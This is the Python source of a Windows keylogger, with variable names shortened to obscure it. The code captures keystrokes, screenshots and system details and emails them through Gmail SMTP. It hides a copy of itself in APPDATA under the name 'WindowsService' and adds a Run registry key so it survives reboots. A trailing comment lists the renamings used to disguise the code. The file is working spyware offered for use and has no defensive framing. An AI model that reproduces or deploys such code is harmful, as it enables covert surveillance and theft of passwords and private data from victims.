# key win
import keyboard as k
import socket as s
import os as o
import platform as p
import smtplib as sm
import base64 as b64
import shutil as sh
import getpass as gp
import winreg as reg
from cryptography.fernet import Fernet as F
from email.mime.text import MIMEText as MT
from email.mime.image import MIMEImage as MI
from email.mime.multipart import MIMEMultipart as MM
from threading import Semaphore as SP, Timer as T
import pyscreenshot as ps

R = 900
E = ""  # Email
P = ""  # Password

K = F.generate_key()
C = F(K)

class A:
    def __init__(self, I):
        self.i = I
        self.l = ""
        self.s = SP(0)

    def e(self, l):
        return C.encrypt(l.encode())

    def c(self, e):
        n = e.name
        if len(n) > 1:
            if n == "space":
                n = " "
            elif n == "enter":
                n = "[ENTER]\n"
            elif n == "decimal":
                n = "."
            else:
                n = n.replace(" ", "_")
                n = f"[{n.upper()}]"
        self.l += n

    @staticmethod
    def sm(e, p, m):
        sr = sm.SMTP(host="smtp.gmail.com", port=587)
        sr.starttls()
        sr.login(e, p)
        sr.sendmail(e, e, m)
        sr.quit()

    @staticmethod
    def si(f):
        d = open(f, 'rb').read()
        m = MM()
        m['Subject'] = 'Screenshot'
        m['From'] = E
        m['To'] = E

        t = MT("Screenshot attached.")
        m.attach(t)
        i = MI(d, name=o.path.basename(f))
        m.attach(i)

        sr = sm.SMTP(host="smtp.gmail.com", port=587)
        sr.starttls()
        sr.login(E, P)
        sr.sendmail(E, E, m.as_string())
        sr.quit()

    def sc(self):
        i = ps.grab()
        cwd = o.getcwd()
        p = o.path.join(cwd, "screenshot.png")
        i.save(p)
        self.si(p)
        o.remove(p)

    def r(self):
        self.sc()
        if self.l:
            el = self.e(self.l)
            self.sm(E, P, el.decode())
        self.l = ""
        T(interval=self.i, function=self.r).start()

    def ci(self):
        hn = s.gethostname()
        ip = s.gethostbyname(hn)
        u = gp.getuser()

        m = f"""
        System Information
        ------------------
        User: {u}
        Architecture: {p.architecture()[0]} {p.architecture()[1]}
        Machine: {p.machine()}
        System: {p.system()} {p.version()}
        Hostname: {hn}
        IP Address: {ip}
        """

        self.sm(E, P, m)

    def ats(self, f):
        try:
            k = reg.HKEY_CURRENT_USER
            kv = r'Software\Microsoft\Windows\CurrentVersion\Run'
            ok = reg.OpenKey(k, kv, 0, reg.KEY_ALL_ACCESS)
            reg.SetValueEx(ok, "AdvancedKeylogger", 0, reg.REG_SZ, f)
            reg.CloseKey(ok)
        except Exception as e:
            print(f"Error adding to startup: {e}")

    def hs(self):
        try:
            hd = o.path.join(o.getenv('APPDATA'), 'WindowsService')
            if not o.path.exists(hd):
                o.makedirs(hd)
            sn = o.path.basename(__file__)
            hp = o.path.join(hd, sn)
            sh.copyfile(__file__, hp)
            self.ats(hp)
        except Exception as e:
            print(f"Error hiding script: {e}")

    def start(self):
        self.hs()
        k.on_release(callback=self.c)
        self.ci()
        self.r()
        self.s.acquire()

if __name__ == "__main__":
    a = A(interval=R)
    a.start()
'''
Renaming Variables and Functions:

keyboard to k
socket to s
os to o
platform to p
smtplib to sm
base64 to b64
shutil to sh
getpass to gp
Semaphore to SP
Timer to T
Fernet to F
callback to c
encrypt_log to e
report to r
sendmail to sm
send_image to si
screenshot to sc
computer_info to ci
add_to_startup to ats
hide_script to hs
'''
